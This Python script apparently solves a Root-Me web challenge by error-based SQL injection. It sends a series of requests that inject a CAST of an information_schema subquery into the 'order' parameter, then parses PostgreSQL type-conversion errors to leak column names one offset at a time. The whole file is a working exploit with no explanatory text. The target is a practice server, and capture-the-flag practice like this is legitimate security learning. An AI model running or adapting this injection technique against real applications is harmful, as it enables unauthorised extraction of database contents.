import httpx
import asyncio
import re
def extract(str1):
    str = str1
    match = re.search(r'invalid input syntax for integer: "([^"]+)"', str)
    if match:
        extracted_value = match.group(0)
        print(extracted_value)
        return extracted_value
    return None
async def main():
    async with httpx.AsyncClient() as client:
        for i in range(10):
            response = await client.get(f'http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,+CAST((select+column_name+from+information_schema.columns+LIMIT+1+OFFSET+{i})+AS+INT)')
            extract(response.text)

if __name__ == '__main__':
    asyncio.run(main())